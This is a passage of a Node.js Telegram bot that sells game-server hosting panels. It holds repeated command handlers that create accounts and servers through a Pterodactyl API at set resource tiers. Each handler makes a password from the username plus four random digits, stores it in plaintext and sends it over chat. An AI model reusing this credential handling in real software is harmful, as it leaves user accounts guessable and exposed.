        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
  try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 5gbv2
bot.onText(/\/5gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /5gbv2 namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "5gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "5048";
  const cpu = "140";
  const disk = "5048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

bot.onText(/\/6gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /6gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "6gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "6048";
  const cpu = "170";
  const disk = "6048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

bot.onText(/\/7gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /7gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "7gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "7048";
  const cpu = "200";
  const disk = "7048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 8gbv2
bot.onText(/\/8gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /8gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "8gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "8048";
  const cpu = "230";
  const disk = "8048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 9gbv2
bot.onText(/\/9gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /9gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "9gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "9048";
  const cpu = "260";
  const disk = "9048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
        await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
        bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

bot.onText(/\/10gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gbv2 namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "10gbv2";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "10000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.Kruzzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domainv2}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domainv2}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domainv2: domainv2,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
      `
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ 𒆜 NAMA: ${username}
┃ ✧ 𒆜 EMAIL: ${email}
┃ ✧ 𒆜 ID: ${user.id}
┃ ✧ 𒆜 MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ 𒆜 DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ 𒆜 CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
        await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domainv2}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
        bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
bot.onText(/\/11gbv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
